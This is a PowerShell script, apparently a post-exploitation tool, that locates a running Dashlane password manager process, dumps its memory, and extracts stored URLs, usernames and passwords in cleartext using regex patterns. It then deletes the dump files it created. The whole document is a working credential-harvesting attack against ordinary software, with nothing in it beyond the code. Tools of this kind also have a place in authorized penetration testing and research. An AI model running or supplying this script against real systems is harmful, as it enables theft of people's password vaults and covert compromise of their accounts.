# Get-DashlaneCredentials.ps1
# AUthor: Jake Miller (@LaconicWolf)
# Credit: Matthew Graeber (@mattifestation) for Out-Minidump and Get-Strings
# Required Dependencies: Out-Minidump; Get-Strings
# Link: https://laconicwolf.com

# Check for the Dashlane processes
If ((Get-Process Dashlane -ErrorAction SilentlyContinue) -ne $Null) {
    $Process = Get-Process Dashlane
}
ElseIf ((Get-Process DashlanePlugin -ErrorAction SilentlyContinue) -ne $Null){
    $Process = Get-Process DashlanePlugin
}
Else {
    Throw "Dashlane not detected"
}

# Dump the process memory and save to a file
$DumpFileName = "$($Process.Name)_$($Process.Id).dmp"
$Process | Out-Minidump

# Search the dump for strings and save to a file
$StringFileName = "$($DumpFileName)_strings.txt"
Get-Strings -Path $DumpFileName -MinimumLength 8 | Out-File -FilePath $StringFileName

# Search the strings file for sensitive data
$RegularExpressions =@(
                       'key="TrustedUrl"><!\[CDATA\[(.*?)\]', # Extracts Urls
                       'key="Login"><!\[CDATA\[(.*?)\]',      # Extracts Usernames
                       'key="Password"><!\[CDATA\[(.*?)\]'    # Extracts Passwords
                       ) 

$SensitiveMatches = @()
foreach ($Regex in $RegularExpressions) {
    Select-String $Regex -InputObject (Get-Content $StringFileName) -AllMatches | 
    Foreach { $SensitiveMatches += $_.matches.Value }
}
$SensitiveMatches = $SensitiveMatches | select -Unique
foreach ($Item in $SensitiveMatches) {
    $Item.split('[')[-1].split(']')[0]
}

# Delete generated files
Remove-Item -Path $DumpFileName
Remove-Item -Path $StringFileName